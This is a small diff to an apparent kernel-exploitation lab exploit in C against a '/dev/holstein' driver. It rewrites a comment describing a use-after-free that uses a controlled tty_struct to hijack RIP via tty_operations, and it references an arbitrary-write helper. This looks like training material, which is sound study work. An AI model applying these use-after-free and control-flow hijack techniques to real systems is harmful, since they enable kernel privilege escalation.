@@ -79,8 +79,8 @@ void AAW32(unsigned long addr, unsigned int val) {
 int main() {
   save_state();
 
-  // First use-after-free. This controlled tty_struct object will be used
-  // to store the fake stack and the RIP control address (tty_operations)
+  // Use-after-free. This controlled tty_struct object will be used to set the
+  // RIP control address (tty_operations)
   fd1 = open("/dev/holstein", O_RDWR);
   fd2 = open("/dev/holstein", O_RDWR);
   if (fd1 == -1 || fd2 == -1)
